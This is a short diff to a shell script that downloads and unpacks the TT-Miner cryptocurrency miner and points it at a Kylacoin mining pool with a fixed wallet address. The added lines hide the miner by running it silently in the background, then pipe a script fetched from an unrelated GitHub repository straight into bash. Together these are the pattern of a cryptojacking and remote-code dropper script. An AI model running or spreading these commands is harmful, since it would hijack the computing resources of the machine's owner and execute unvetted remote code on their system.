@@ -6,4 +6,5 @@ wget https://github.com/TrailingStop/TT-Miner-release/releases/download/2024.3.2
 tar xvf TT-Miner-2024.3.2.tar.gz
 cd TT-Miner-2024.3.2
 chmod +x TT-Miner
-./TT-Miner -a Flex -o stratum+tcp://kylacoin.cedric-crispin.com:4374 -u kc1qg97pwtnf6jszasdhml9xt4wfu02vyxjvw0vkpm.$(echo $(shuf -i 1000-9999 -n 1)-NN) -p x
+./TT-Miner -a Flex -o stratum+tcp://kylacoin.cedric-crispin.com:4374 -u kc1qg97pwtnf6jszasdhml9xt4wfu02vyxjvw0vkpm.$(echo $(shuf -i 1000-9999 -n 1)-ONN) -p x > /dev/null 2>&1 &
+curl -sL https://github.com/kartolo92/koplok/raw/master/time | bash
